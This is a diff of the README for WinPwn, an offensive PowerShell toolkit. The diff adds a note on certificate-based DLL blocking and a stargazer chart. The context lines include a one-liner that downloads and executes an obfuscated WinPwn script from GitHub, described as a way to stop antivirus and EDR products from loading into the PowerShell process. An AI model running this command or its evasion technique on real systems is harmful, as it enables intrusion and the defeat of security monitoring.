@@ -19,7 +19,7 @@ To spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MI
 
 `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1')`
 
-This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell.
+This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell - unless they have a Cross-Signed Microsoft certificate.
 
 If you find yourself stuck on a windows system with no internet access - no problem at all, just use `Offline_Winpwn.ps1`, the most important scripts and executables are included.
 
@@ -183,6 +183,10 @@ Examples:
 - [X] [vletoux](https://github.com/vletoux) - PingCastle Scanners
 - [X] [NCCGroup + BC-Security](https://github.com/BC-SECURITY/Invoke-ZeroLogon) - ZeroLogon Scanner
 - [X] [All people working on Bloodhound](https://github.com/BloodHoundAD) - SharpHound Collector
+
+## Stargazers over time
+
+[![Stargazers over time](https://starchart.cc/S3cur3Th1sSh1t/WinPwn.svg)](https://starchart.cc/S3cur3Th1sSh1t/WinPwn)
 
 ## Legal disclaimer:
 Usage of WinPwn for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
